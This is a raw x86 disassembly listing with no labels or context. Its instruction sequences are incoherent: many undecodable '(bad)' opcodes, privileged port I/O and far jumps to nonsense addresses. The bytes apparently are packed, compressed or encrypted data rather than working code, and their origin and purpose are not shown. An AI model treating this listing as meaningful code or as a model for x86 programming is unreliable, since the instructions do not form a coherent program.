  41dc06:	paddb  mm4,mm4
  41dc09:	repnz sbb BYTE PTR [esi],dl
  41dc0c:	mov    ebp,0x78a5e642
  41dc11:	cwde   
  41dc12:	mov    cl,0xad
  41dc14:	lds    esp,FWORD PTR [ebx+0x7deef89a]
  41dc1a:	jge    0x41dbd8
  41dc1c:	aam    0x4
  41dc1e:	dec    esp
  41dc1f:	pop    ecx
  41dc20:	jb     0x41dc3b
  41dc22:	push   0xfffffff5
  41dc24:	sbb    bl,BYTE PTR [edi+0x7edd3acc]
  41dc2a:	push   ebx
  41dc2b:	mov    edx,0x9b129af6
  41dc30:	mov    edx,0xe63ee460
  41dc35:	mov    eax,ds:0xd9f498f3
  41dc3a:	mov    ds:0xf589a7c5,eax
  41dc3f:	ds ret 
  41dc41:	ss scas eax,DWORD PTR es:[edi]
  41dc43:	test   ebp,edi
  41dc45:	sahf   
  41dc46:	lea    esi,[ecx+0x21]
  41dc49:	dec    ebp
  41dc4a:	jb     0x41dc16
  41dc4c:	ret    
  41dc4d:	xchg   ebx,eax
  41dc4e:	xchg   esp,eax
  41dc4f:	in     al,0x5b
  41dc51:	xchg   esp,eax
  41dc52:	adc    eax,0x9fdbc50c
  41dc57:	ror    DWORD PTR [edi],cl
  41dc59:	jnp    0x41dcd9
  41dc5b:	fdivr  DWORD PTR [edi+0xe4a15eb]
  41dc61:	cmp    BYTE PTR [ebx-0x21],ah
  41dc64:	aas    
  41dc65:	xchg   ecx,eax
  41dc66:	idiv   DWORD PTR ds:0xc6d1080f
  41dc6c:	push   0x94197245
  41dc71:	int    0xfe
  41dc73:	lock ins DWORD PTR es:[edi],dx
  41dc75:	adc    esp,edx
  41dc77:	(bad)  ds:0x83cd002f
  41dc7d:	test   BYTE PTR [ecx+0x134ea0c7],dh
  41dc83:	into   
  41dc84:	mov    eax,0x8d7cb87
  41dc89:	in     eax,dx
  41dc8a:	jb     0x41dc1a
  41dc8c:	test   al,0x48
  41dc8e:	and    eax,ebp
  41dc90:	and    al,0x4c
  41dc92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc93:	shr    DWORD PTR [esi],1
  41dc95:	std    
  41dc96:	test   BYTE PTR [ebx],0xea
  41dc99:	and    DWORD PTR [esi-0x33180058],0xd
  41dca0:	mov    ds:0xee09e108,al
  41dca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca6:	in     al,0x67
  41dca8:	scas   al,BYTE PTR es:[edi]
  41dca9:	mov    eax,0xc32e26d
  41dcae:	repnz mov ah,BYTE PTR [ebx+0x4c]
  41dcb2:	pop    ds
  41dcb3:	inc    eax
  41dcb4:	dec    ebp
  41dcb5:	pop    edi
  41dcb6:	test   eax,0xbfce2468
  41dcbb:	mov    bh,0x80
  41dcbd:	repnz pop eax
  41dcbf:	mov    bh,0xf5
  41dcc1:	add    BYTE PTR [edx-0x4],0xbb
  41dcc5:	mov    ch,0xb1
  41dcc7:	add    BYTE PTR [ebp+0x22],ch
  41dcca:	gs int3 
  41dccc:	mov    ebp,0x39ef8170
  41dcd1:	stc    
  41dcd2:	hlt    
  41dcd3:	jge    0x41dc9e
  41dcd5:	arpl   WORD PTR [ebx-0x3f],bp
  41dcd8:	pop    eax
  41dcd9:	mov    dh,0xb6
  41dcdb:	jne    0x41dcae
  41dcdd:	imul   ebx,DWORD PTR [eax+0x57],0x39586d04
  41dce4:	out    dx,al
  41dce5:	fidiv  WORD PTR [esi+eiz*2]
  41dce8:	dec    ebp
  41dce9:	pop    ecx
  41dcea:	pop    ds
  41dceb:	adc    al,0x15
  41dced:	into   
  41dcee:	lahf   
  41dcef:	cdq    
  41dcf0:	scas   al,BYTE PTR es:[edi]
  41dcf1:	or     bl,bl
  41dcf3:	loopne 0x41dcec
  41dcf5:	ins    BYTE PTR es:[edi],dx
  41dcf6:	xor    eax,DWORD PTR cs:[ecx]
  41dcf9:	sti    
  41dcfa:	sbb    al,0x3a
  41dcfc:	push   eax
  41dcfd:	and    al,al
  41dcff:	jno    0x41dcf8
  41dd01:	enter  0xa71e,0xe3
  41dd05:	cmc    
  41dd06:	and    esp,edi
  41dd08:	mov    ebp,0xb6c983ad
  41dd0d:	sbb    BYTE PTR [edi],cl
  41dd0f:	mov    edx,0x5b94b412
  41dd14:	adc    edx,esp
  41dd16:	retf   
  41dd17:	loopne 0x41dd8c
  41dd19:	mov    ah,0xbd
  41dd1b:	aad    0xad
  41dd1d:	psrlw  mm5,mm3
  41dd20:	jle    0x41dd1c
  41dd22:	sti    
  41dd23:	or     al,0x24
  41dd25:	push   ds
  41dd26:	bound  ebp,QWORD PTR [eax-0x602ac4e0]
  41dd2c:	stc    
  41dd2d:	dec    ebx
  41dd2e:	ss test al,0xa6
  41dd31:	fcomp  st(2)
  41dd33:	xchg   ebx,eax
  41dd34:	cmp    DWORD PTR [eax],edi
  41dd36:	push   0x6f
  41dd38:	cmp    BYTE PTR [esi],ch
  41dd3a:	sbb    bl,BYTE PTR [edx]
  41dd3c:	xor    edx,esp
  41dd3e:	mov    ebp,0xf01e6e61
  41dd43:	sar    BYTE PTR [esi+eiz*8-0x3a],1
  41dd47:	ins    BYTE PTR es:[edi],dx
  41dd48:	push   0x25
  41dd4a:	nop
  41dd4b:	mov    eax,0x7c156b4e
  41dd50:	mov    dh,0x4c
  41dd52:	repz jp 0x41dd32
  41dd55:	pop    ebx
  41dd56:	push   0x65ed6763
  41dd5b:	(bad)  
  41dd5c:	(bad)  
  41dd5d:	jne    0x41dd66
  41dd5f:	not    DWORD PTR [esi]
  41dd61:	or     bh,cl
  41dd63:	xlat   BYTE PTR ds:[ebx]
  41dd64:	call   0x788dbbad
  41dd69:	sbb    edi,DWORD PTR [ebp-0x6250ecf7]
  41dd6f:	sbb    BYTE PTR [edx-0x79],dh
  41dd72:	mov    edx,0x371c2007
  41dd77:	fwait
  41dd78:	pop    ecx
  41dd79:	jmp    0xfdad:0xce713e65
  41dd80:	mov    eax,0xba2234a
  41dd85:	or     al,0xa4
  41dd87:	neg    BYTE PTR [ebx]
  41dd89:	pusha  
  41dd8a:	aad    0xc9
  41dd8c:	lea    edi,[esi+0x5951016e]
  41dd92:	lahf   
  41dd93:	pop    es
  41dd94:	and    bh,dh
  41dd96:	aas    
  41dd97:	test   eax,0x6dd66ddd
  41dd9c:	out    0x31,eax
  41dd9e:	(bad)  
  41dd9f:	cmp    ecx,DWORD PTR [edx]
  41dda1:	xchg   al,dl
  41dda3:	push   0xd9a1198b
  41dda8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dda9:	jg     0x41ddc4
  41ddab:	sub    eax,0x13980bb4
  41ddb0:	jbe    0x41de05
  41ddb2:	or     ebp,DWORD PTR [ebp+0x7bc70272]
  41ddb8:	adc    al,0x99
  41ddba:	lahf   
  41ddbb:	inc    esp
  41ddbc:	mov    ebp,0x6a34ef35
  41ddc1:	adc    al,0xcb
  41ddc3:	mov    ds:0x12ebae42,al
  41ddc8:	int3   
  41ddc9:	push   DWORD PTR [edi-0x24086e6b]
  41ddcf:	pop    eax
  41ddd0:	pcmpeqw mm5,QWORD PTR [esi-0x7c6569ef]
  41ddd7:	mov    ebp,?
  41ddd9:	(bad)  
  41dddb:	xchg   dh,ch
  41dddd:	aas    
  41ddde:	pextrw eax,mm0,0xe0
  41dde2:	int3   
  41dde3:	scas   al,BYTE PTR es:[edi]
  41dde4:	sub    DWORD PTR [esi],ebx
  41dde6:	fimul  WORD PTR [esi-0x2d]
  41dde9:	shl    dl,1
  41ddeb:	sub    DWORD PTR cs:0xb89fdc84,ebp
  41ddf2:	push   ds
  41ddf3:	cmc    
  41ddf4:	sahf   
  41ddf5:	(bad)  
  41ddf6:	mov    WORD PTR [ebx+ebp*2-0x36],ds
  41ddfa:	mov    edx,0x88ae4539
  41ddff:	or     al,0xb7
  41de01:	pop    ecx
  41de02:	mov    esi,0x82dce872
  41de07:	pop    edx
  41de08:	pop    esi
  41de09:	pop    ecx
  41de0a:	sbb    DWORD PTR [esi+ebp*8+0x24],0xb8ae4bc9
  41de12:	inc    edi
  41de13:	adc    ebp,DWORD PTR [ebx]
  41de15:	add    esi,DWORD PTR [ebx+eiz*1+0x456e0464]
  41de1c:	and    dh,0x63
  41de1f:	mov    ds:0x28ce692,eax
  41de24:	js     0x41ddae
  41de26:	hlt    
  41de27:	sbb    al,0xd5
  41de29:	in     al,dx
  41de2a:	inc    ecx
  41de2b:	int    0x35
  41de2d:	(bad)  
  41de2e:	sub    cl,BYTE PTR [edi+0x1a]
  41de31:	leave  
  41de32:	sub    ecx,DWORD PTR [eax+0x5f]
  41de35:	mov    ?,WORD PTR [ebp+ebp*4+0x6ef2fa2c]
  41de3c:	push   cs
  41de3d:	push   ecx
  41de3e:	das    
  41de3f:	mov    esi,0xbc9309c4
  41de44:	push   ss
  41de45:	or     DWORD PTR [ecx-0x3c],edx
  41de48:	data16 das 
  41de4a:	(bad)  
  41de4b:	or     ch,BYTE PTR [ecx+0xde2d674]
  41de51:	sti    
  41de52:	dec    ebx
  41de53:	xor    eax,0x4af4a843
  41de58:	shl    ch,0xa0
  41de5b:	mov    al,0x96
  41de5d:	clc    
  41de5e:	dec    edx
  41de5f:	repz call 0x89bb:0xbacaa2c9
  41de67:	(bad)
  41de6a:	ins    DWORD PTR es:[edi],dx
  41de6b:	(bad)  
  41de6c:	imul   edi,edx,0xffffffaf
  41de6f:	imul   esi,DWORD PTR [ecx],0x50
  41de72:	stos   BYTE PTR es:[edi],al
  41de73:	(bad)  
  41de74:	sbb    DWORD PTR [edi+edi*4-0x21],eax
  41de78:	jmp    0x1779b262
  41de7d:	cmp    eax,0x5bfd416f
  41de82:	push   0x58
  41de84:	call   0xd835:0xbb6b4e72
  41de8b:	ret    0xd532
  41de8e:	mov    DWORD PTR [ebx-0x23],eax
  41de91:	lds    edi,FWORD PTR [ebx+0x399e5857]
  41de97:	imul   esp,DWORD PTR [ebx],0xc1ccfa63
  41de9d:	jecxz  0x41dee6
  41de9f:	jmp    0x1fb68578
  41dea4:	stos   DWORD PTR es:[edi],eax
  41dea5:	jmp    0x41de2c
  41dea7:	cmp    DWORD PTR [ebp+ebx*2-0x4],esi
  41deab:	jbe    0x41de49
  41dead:	xor    ebx,DWORD PTR [ebx+0x74f77189]
  41deb3:	aas    
  41deb4:	aas    
  41deb5:	pop    ds
  41deb6:	mov    bl,0x4b
  41deb8:	sti    
  41deb9:	dec    ecx
  41deba:	ss daa 
  41debc:	stos   BYTE PTR es:[edi],al
  41debd:	cmp    BYTE PTR [edi+eiz*8],dh
  41dec0:	test   al,0xe3
  41dec2:	add    BYTE PTR [edi+0x55],0xde
  41dec6:	push   0xcbddcfdb
  41decb:	sti    
  41decc:	into   
  41decd:	ds pushf 
  41decf:	jg     0x41df0e
  41ded1:	les    ecx,FWORD PTR [esi]
  41ded3:	(bad)  
  41ded4:	stc    
  41ded5:	and    DWORD PTR [ebp+0x65],edx
  41ded8:	pusha  
  41ded9:	clc    
  41deda:	loope  0x41de73
  41dedc:	retf   
  41dedd:	push   0x99d465f2
  41dee2:	mov    DWORD PTR [ecx-0x1fd5c6d2],esp
  41dee8:	and    BYTE PTR [eax+0x14927526],ch
  41deee:	not    BYTE PTR [edi]
  41def0:	retf   0x3704
  41def3:	daa    
  41def4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def5:	xchg   DWORD PTR [ebx+0x235e1c9f],edx
  41defb:	test   DWORD PTR [ebp+ebp*8+0x7e],ebx
  41deff:	or     DWORD PTR [eax-0x72],ebp
  41df02:	jbe    0x41dee2
  41df04:	sub    cl,BYTE PTR [eax]
  41df06:	push   eax
  41df07:	pop    ebx
  41df08:	fidiv  WORD PTR [esi]
  41df0a:	mov    ds:0x239b0a8f,eax
  41df0f:	dec    ebp
  41df10:	add    bh,ch
  41df12:	cmp    DWORD PTR [ebx+0x4e],eax
  41df15:	clc    
  41df16:	jmp    0x2f19f1c9
  41df1b:	sub    eax,0xe4cee7fe
  41df20:	adc    BYTE PTR [edx],dh
  41df22:	lock loop 0x41deec
  41df25:	imul   eax,edx,0xa7a9f724
  41df2b:	xor    eax,0x66a1f556
  41df30:	jle    0x41df55
  41df32:	cwde   
  41df33:	ret    0x405b
  41df36:	push   esi
  41df37:	(bad)  
  41df38:	outs   dx,DWORD PTR ds:[esi]
  41df39:	fwait
  41df3a:	out    dx,eax
  41df3b:	sbb    bl,BYTE PTR [eax+0x13]
  41df3e:	cwde   
  41df3f:	outs   dx,BYTE PTR ds:[esi]
  41df40:	call   FWORD PTR [edi+0x6da1d4ae]
  41df46:	loope  0x41dfa2
  41df48:	in     al,0x3d
  41df4a:	into   
  41df4b:	aas    
  41df4c:	cdq    
  41df4d:	xlat   BYTE PTR ds:[ebx]
  41df4e:	inc    esp
  41df4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df50:	push   cs
  41df51:	int3   
  41df52:	repz imul ecx,DWORD PTR [esi+0x1],0xffffffed
  41df57:	std    
  41df58:	pop    edi
  41df59:	xor    al,0x21
  41df5b:	push   esi
  41df5c:	lds    edi,FWORD PTR [edi+ebx*1-0x74576856]
  41df63:	dec    eax
  41df64:	sbb    eax,0x5e4eb806
  41df69:	adc    dh,BYTE PTR [ebx-0x5d219218]
  41df6f:	xor    al,0xac
  41df71:	sub    eax,0x6ac7534f
  41df76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df77:	in     al,dx
  41df78:	mov    eax,ds:0xbd479722
  41df7d:	lea    edx,[ebx+0x7f]
  41df80:	add    al,0xfd
  41df82:	std    
  41df83:	xor    ch,BYTE PTR [edx]
  41df85:	ja     0x41e002
  41df87:	mov    eax,0xc95fe7d5
  41df8c:	dec    ebp
  41df8d:	sub    DWORD PTR [ecx],edx
  41df8f:	push   cs
  41df90:	jg     0x41e00a
  41df92:	outs   dx,BYTE PTR ds:[esi]
  41df93:	sar    BYTE PTR [ebx-0x3f],cl
  41df96:	jecxz  0x41dfb3
  41df98:	clc    
  41df99:	(bad)  
  41df9a:	and    DWORD PTR [edi+ebp*4+0x57],esi
  41df9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfa0:	mov    ds:0x3a4fdfd6,al
  41dfa5:	(bad)  
  41dfa6:	mov    ecx,0x417b4d7a
  41dfab:	jo     0x41df88
  41dfad:	sbb    eax,0xb93a3d4a
  41dfb2:	jbe    0x41dfc3
  41dfb4:	xor    BYTE PTR [ecx],dl
  41dfb6:	push   ss
  41dfb7:	aad    0xfd
  41dfb9:	mov    eax,ds:0x3d96f56
  41dfbe:	clc    
  41dfbf:	sti    
  41dfc0:	cmp    edx,DWORD PTR [eax+0x43]
  41dfc3:	dec    esi
  41dfc4:	dec    ebp
  41dfc5:	xchg   ebx,eax
  41dfc6:	jbe    0x41dfd3
  41dfc8:	ret    0x360b
  41dfcb:	inc    eax
  41dfcc:	push   ss
  41dfcd:	je     0x41dfa9
  41dfcf:	push   esp
  41dfd0:	icebp  
  41dfd1:	inc    esp
  41dfd2:	rcr    BYTE PTR [edx-0x76b8a944],0xfc
  41dfd9:	xor    cl,BYTE PTR [eax]
  41dfdb:	aaa    
  41dfdc:	fwait
  41dfdd:	xor    ecx,DWORD PTR [ebp-0x1e]
  41dfe0:	add    bl,cl
  41dfe2:	xchg   ebp,eax
  41dfe3:	fisttp WORD PTR [ebp+eiz*2-0x80]
  41dfe7:	lods   al,BYTE PTR ds:[esi]
  41dfe8:	div    DWORD PTR [esi-0x11]
  41dfeb:	mov    eax,cs:0xc8cab8c8
  41dff1:	pusha  
  41dff2:	adc    ecx,DWORD PTR [ecx]
  41dff4:	mov    ecx,0x65a7ed96
  41dff9:	mov    ch,ah
  41dffb:	cmc    
  41dffc:	imul   eax,ebx,0x21
  41dfff:	xchg   edx,eax
  41e000:	jbe    0x41dfb3
  41e002:	faddp  st(4),st
  41e004:	push   cs
  41e005:	cwde   
  41e006:	sbb    al,0xdf
  41e008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e009:	mov    DWORD PTR [edi],ebx
  41e00b:	xchg   ebx,eax
  41e00c:	mov    WORD PTR [ebp+0x41],cs
  41e00f:	lock shr BYTE PTR [ecx],1
  41e012:	xchg   esp,eax
  41e013:	add    DWORD PTR [edi],edi
  41e015:	sub    eax,esp
  41e017:	loopne 0x41e000
  41e019:	lds    edi,FWORD PTR [eax]
  41e01b:	and    ch,BYTE PTR [ebx+0x1dadbb24]
  41e021:	push   edi
  41e022:	icebp  
  41e023:	ins    BYTE PTR es:[edi],dx
  41e024:	cmc    
  41e025:	lods   eax,DWORD PTR ds:[esi]
  41e026:	xchg   cl,cl
  41e028:	xchg   edi,eax
  41e029:	mov    esi,0xf058c4c
  41e02e:	loopne 0x41e0ab
  41e030:	adc    al,0xbc
  41e032:	xor    BYTE PTR [ebp-0x2],al
  41e035:	cdq    
  41e036:	jl     0x41e03c
  41e038:	or     al,0xbb
  41e03a:	mov    ecx,0x54277179
  41e03f:	rol    BYTE PTR [ecx-0x39],cl
  41e042:	cmp    bh,BYTE PTR [ebp-0x4f]
  41e045:	mov    ecx,0x7671881e
  41e04a:	push   ds
  41e04b:	push   DWORD PTR [edx+0x3614631f]
  41e051:	cmc    
  41e052:	in     eax,dx
  41e053:	dec    ecx
  41e054:	pop    edx
  41e055:	loop   0x41dffe
  41e057:	xchg   ebp,eax
  41e058:	mov    eax,0x71aff49d
  41e05d:	add    eax,0x92cd451c
  41e062:	ss adc eax,0x6f9c0ff2
  41e068:	outs   dx,BYTE PTR ds:[esi]
  41e069:	jnp    0x41e0da
  41e06b:	jae    0x41e00a
  41e06d:	nop
  41e06e:	dec    edi
  41e06f:	or     BYTE PTR [edx-0x67a1a13],ch
  41e075:	cmp    ah,BYTE PTR [edx]
  41e077:	mov    ds:0x2c3eb44c,eax
  41e07c:	gs lahf 
  41e07e:	or     dl,0x58
  41e081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e082:	mov    dh,0xb9
  41e084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e085:	add    ah,dh
  41e087:	jne    0x41e08a
  41e089:	add    eax,0x64985f41
  41e08e:	dec    ebx
  41e08f:	cmp    edi,DWORD PTR [ecx+esi*2+0x720a2c5a]
  41e096:	aas    
  41e097:	aad    0x42
  41e099:	mov    bl,0xf9
  41e09b:	out    dx,eax
  41e09c:	std    
  41e09d:	mov    eax,ds:0xcac21174
  41e0a2:	fwait
  41e0a3:	cmp    ah,dl
  41e0a5:	xor    al,0xf7
  41e0a7:	neg    BYTE PTR [ebx]
  41e0a9:	mov    dl,0x8d
  41e0ab:	(bad)  
  41e0ac:	cli    
  41e0ad:	in     eax,dx
  41e0ae:	or     ebp,DWORD PTR [ecx+0x2c2fb9bd]
  41e0b4:	xchg   ebx,eax
  41e0b5:	inc    eax
  41e0b6:	jmp    0x41e116
  41e0b8:	not    DWORD PTR [edx+0x50db9d05]
  41e0be:	push   ebx
  41e0bf:	out    dx,eax
  41e0c0:	xor    al,0x8
  41e0c2:	imul   esi,DWORD PTR [eax],0x2cd33dd5
  41e0c8:	pop    ebp
  41e0c9:	outs   dx,BYTE PTR ds:[esi]
  41e0ca:	add    DWORD PTR [esi+0x7a],0x376fd7b2
  41e0d1:	or     cl,BYTE PTR [ecx]
  41e0d3:	cs in  al,0xe
  41e0d6:	mov    ebp,0x3e6f06d4
  41e0db:	mov    esp,edi
  41e0dd:	pop    ecx
  41e0de:	test   eax,0x65c9e712
  41e0e4:	sbb    BYTE PTR [edx+edx*8],cl
  41e0e7:	in     al,0x73
  41e0e9:	cmc    
  41e0ea:	sbb    DWORD PTR [eax-0x38f204e8],0x8cd62f07
  41e0f4:	mov    edi,0xd61efee0
  41e0f9:	ror    ecx,cl
  41e0fb:	fld    TBYTE PTR [esi+0x43]
  41e0fe:	jnp    0x41e083
  41e100:	into   
  41e101:	leave  
  41e102:	std    
  41e103:	push   0x56b27b6d
  41e108:	mov    esp,0x5bfc2f55
  41e10d:	inc    esi
  41e10e:	inc    eax
  41e10f:	mov    esi,0xed29e352
  41e114:	mov    esi,0x228d7eac
  41e119:	push   edx
  41e11a:	and    eax,0xb59c54b2
  41e11f:	(bad)  
  41e120:	jmp    0x256c0c20
  41e125:	call   FWORD PTR [ebx]
  41e127:	mov    cl,0x0
  41e129:	sub    BYTE PTR [ebx+0x5914faea],ch
  41e12f:	mov    eax,ds:0x5a0d93cf
  41e134:	add    DWORD PTR [edx+ebp*4+0x6c9dda16],ebx
  41e13b:	jno    0x41e1af
  41e13d:	daa    
  41e13e:	mov    cl,0xfb
  41e140:	or     BYTE PTR [edx-0x6c],bh
  41e143:	jg     0x41e14b
  41e145:	(bad)  
  41e146:	xchg   esp,eax
  41e147:	(bad)  
  41e149:	add    BYTE PTR [esi+0x6a],0x59
  41e14d:	jne    0x41e1a9
  41e14f:	push   ecx
  41e150:	cli    
  41e151:	xchg   BYTE PTR [ebp+0x2e],al
  41e154:	fimul  DWORD PTR [ecx]
  41e156:	pusha  
  41e157:	add    BYTE PTR [edx],0x8d
  41e15a:	aad    0x7b
  41e15c:	lods   al,BYTE PTR ds:[esi]
  41e15d:	jnp    0x41e132
  41e15f:	cmp    cl,ah
  41e161:	(bad)  
  41e162:	or     BYTE PTR [edi],bl
  41e164:	loop   0x41e1d0
  41e166:	pop    es
  41e167:	fnstsw WORD PTR [edx-0x74]
  41e16a:	inc    al
  41e16c:	jae    0x41e1cf
  41e16e:	dec    edx
  41e16f:	and    al,0xff
  41e171:	sub    eax,0x261e2fc6
  41e176:	and    al,ah
  41e178:	bswap  edx
  41e17a:	std    
  41e17b:	ret    
  41e17c:	retf   
  41e17d:	and    al,0x5f
  41e17f:	shl    ebp,0x18
  41e182:	xchg   edx,eax
  41e183:	(bad)  
  41e185:	retf   
  41e186:	dec    ecx
  41e187:	pop    ebx
  41e188:	ror    DWORD PTR [eax+0x644da837],1
  41e18e:	addr16 leave 
  41e190:	sahf   
  41e191:	jle    0x41e1d5
  41e193:	jnp    0x41e146
  41e195:	dec    ebp
  41e196:	push   esp
  41e197:	(bad)  
  41e198:	icebp  
  41e199:	mov    bl,0x23
  41e19b:	popf   
  41e19c:	sbb    edx,esp
  41e19e:	pop    esp
  41e19f:	in     al,0x22
  41e1a1:	cdq    
  41e1a2:	test   DWORD PTR ds:0xc4c4002c,ecx
  41e1a8:	dec    ecx
  41e1a9:	sbb    DWORD PTR ds:0xc79308f1,eax
  41e1af:	hlt    
  41e1b0:	fistp  WORD PTR [edi]
  41e1b2:	pop    es
  41e1b3:	nop
  41e1b4:	lahf   
  41e1b5:	xchg   ebp,eax
  41e1b6:	xor    DWORD PTR [edi-0x26],edx
  41e1b9:	mov    ebx,DWORD PTR [ebp+eiz*4+0x39]
  41e1bd:	fist   DWORD PTR [ecx-0x6ebe89e4]
  41e1c3:	mov    ebp,?
  41e1c5:	and    bh,BYTE PTR [ebx]
  41e1c7:	cmp    al,0x7a
  41e1c9:	push   esi
  41e1ca:	in     al,0x9e
  41e1cc:	mov    DWORD PTR [eax-0x3d],edx
  41e1cf:	mov    edx,0x4a9cc6d7
  41e1d4:	ins    DWORD PTR es:[edi],dx
  41e1d5:	fldenv [ecx]
  41e1d7:	cdq    
  41e1d8:	adc    bh,cl
  41e1da:	js     0x41e208
  41e1dc:	scas   al,BYTE PTR es:[edi]
  41e1dd:	mov    eax,ds:0x856550ff
  41e1e2:	std    
  41e1e3:	adc    BYTE PTR [ebx-0x10],dh
  41e1e6:	ror    DWORD PTR [ebp-0x53054070],cl
  41e1ec:	out    dx,eax
  41e1ed:	(bad)  
  41e1ee:	xchg   esi,eax
  41e1ef:	int3   
  41e1f0:	sti    
  41e1f1:	ins    DWORD PTR es:[edi],dx
  41e1f2:	data16 (bad) 
  41e1f4:	jne    0x41e1d3
  41e1f6:	mov    cl,0xd3
  41e1f8:	push   edx
  41e1f9:	sub    ch,ch
  41e1fb:	adc    al,0x46
  41e1fd:	mov    edx,0xd1ba51b0
  41e202:	call   0xe037:0xa17abd
  41e209:	ins    BYTE PTR es:[edi],dx
  41e20a:	rcl    ah,0x4f
  41e20d:	ja     0x41e193
  41e20f:	mov    ds:0xf72ddbb9,al
  41e214:	jmp    0x15f7:0x1ce8006b
  41e21b:	xor    DWORD PTR [edi-0x59],edx
  41e21e:	jb     0x41e1b3
  41e220:	je     0x41e275
  41e222:	xor    DWORD PTR [ebx-0x417c6677],edi
  41e228:	mov    DWORD PTR [ebx],eax
  41e22a:	rcl    BYTE PTR [ecx-0x677ea8c2],0x94
  41e231:	fimul  WORD PTR [ecx+0x3]
  41e234:	shl    ebp,1
  41e236:	push   esi
  41e237:	mov    DWORD PTR [edx+0x5eb40519],edi
  41e23d:	push   edx
  41e23e:	popa   
  41e23f:	ss hlt 
  41e241:	aaa    
  41e242:	lods   al,BYTE PTR ds:[esi]
  41e243:	jmp    0x41e262
  41e245:	fdivr  QWORD PTR [ecx+0x3b]
  41e248:	popf   
  41e249:	hlt    
  41e24a:	cdq    
  41e24b:	es and bl,bl
  41e24e:	pusha  
  41e24f:	lods   eax,DWORD PTR ds:[esi]
  41e250:	mov    al,ds:0xc418caa3
  41e255:	xchg   ebp,eax
  41e256:	aaa    
  41e257:	push   esi
  41e258:	div    DWORD PTR [edi+0x5b]
  41e25b:	int    0xf3
  41e25d:	out    dx,eax
  41e25e:	sti    
  41e25f:	sub    al,0x57
  41e261:	jbe    0x41e27c
  41e263:	repz in al,0x8
  41e266:	test   al,0x54
  41e268:	inc    ecx
  41e269:	mov    ecx,0xc41940c0
  41e26e:	(bad)  
  41e26f:	adc    al,0x47
  41e271:	adc    eax,ebp
  41e273:	dec    esp
  41e274:	nop
  41e275:	jl     0x41e2e1
  41e277:	sub    edx,DWORD PTR gs:[ecx-0x5]
  41e27b:	and    BYTE PTR [edi-0x74157cfd],bl
  41e281:	sbb    dh,ah
  41e283:	dec    esp
  41e284:	scas   al,BYTE PTR es:[edi]
  41e285:	xor    eax,0x140c8d9
  41e28a:	ja     0x41e252
  41e28c:	jo     0x41e226
  41e28e:	xchg   ecx,eax
  41e28f:	lods   al,BYTE PTR ds:[esi]
  41e290:	push   es
  41e291:	nop
  41e292:	lea    esp,[esi]
  41e294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e295:	add    bh,al
  41e297:	aad    0x9a
  41e299:	jg     0x41e2d0
  41e29b:	add    dh,ch
  41e29d:	jns    0x41e2ac
  41e29f:	sahf   
  41e2a0:	or     bh,BYTE PTR [edx+0x38de0edd]
  41e2a6:	fwait
  41e2a7:	call   0xd330:0x8558e2f
  41e2ae:	cli    
  41e2af:	les    ecx,FWORD PTR [esi+0x58]
  41e2b2:	pop    esp
  41e2b3:	sub    al,0x98
  41e2b5:	or     DWORD PTR [edx],0xbe9384c5
  41e2bb:	rcr    BYTE PTR [edi+eiz*4+0x3c],1
  41e2bf:	cdq    
  41e2c0:	dec    ebx
  41e2c1:	daa    
  41e2c2:	and    al,0xa1
  41e2c4:	push   ds
  41e2c5:	cdq    
  41e2c6:	mov    al,0x15
  41e2c8:	xchg   edi,eax
  41e2c9:	adc    dl,BYTE PTR [ebx]
  41e2cb:	push   edx
  41e2cc:	cmp    dh,BYTE PTR ds:0xc1a1b008
  41e2d2:	push   ds
  41e2d3:	mov    ecx,0x71cc51c3
  41e2d8:	jno    0x41e32e
  41e2da:	adc    ebx,0xb0a35a5a
  41e2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2e1:	jnp    0x41e2d1
  41e2e3:	xor    BYTE PTR [ebx+0x394e7554],dh
  41e2e9:	clc    
  41e2ea:	cli    
  41e2eb:	inc    ebp
  41e2ec:	out    dx,eax
  41e2ed:	cmp    esp,eax
  41e2ef:	stos   DWORD PTR es:[edi],eax
  41e2f0:	pop    esi
  41e2f1:	imul   ebx,DWORD PTR [ebx+0x5],0xe50eb7d
  41e2f8:	lods   al,BYTE PTR ds:[esi]
  41e2f9:	cmp    DWORD PTR [esi+ecx*2+0x67197e41],esi
  41e300:	outs   dx,DWORD PTR ds:[esi]
  41e301:	xor    esi,eax
  41e303:	rcl    dh,1
  41e305:	dec    ebx
  41e306:	lds    ebp,FWORD PTR [edx+0x6a6e4576]
  41e30c:	fcmovnu st,st(4)
  41e30e:	stos   BYTE PTR es:[edi],al
  41e30f:	push   esi
  41e310:	mov    edi,0x1368ec8d
  41e315:	icebp  
  41e316:	push   ds
  41e317:	xor    DWORD PTR ds:0xea6f991b,0x3a
  41e31e:	jno    0x41e2f4
  41e320:	add    eax,0xe292dec9
  41e325:	shr    BYTE PTR [esp+ebp*8+0x28],0xa1
  41e32a:	js     0x41e324
  41e32c:	xchg   DWORD PTR [ecx+esi*1],eax
  41e32f:	add    al,0xec
  41e331:	jmp    0x41e2c5
  41e333:	call   FWORD PTR [edx+0x4bcd8c05]
  41e339:	pop    ss
  41e33a:	adc    al,0x72
  41e33c:	rcl    DWORD PTR [edx],cl
  41e33e:	push   0x3b
  41e340:	cmp    bh,bl
  41e342:	xchg   esi,eax
  41e343:	aad    0xc8
  41e345:	ins    BYTE PTR es:[edi],dx
  41e346:	addr16 dec edi
  41e348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e349:	or     al,bl
  41e34b:	rcr    BYTE PTR [edi+0x5e],cl
  41e34e:	lock jmp 0x41e30d
  41e351:	inc    edi
  41e352:	aaa    
  41e353:	mov    eax,ds:0x606d5bd2
  41e358:	or     eax,0xe3a10fbd
  41e35d:	xchg   DWORD PTR [edx-0x31],esp
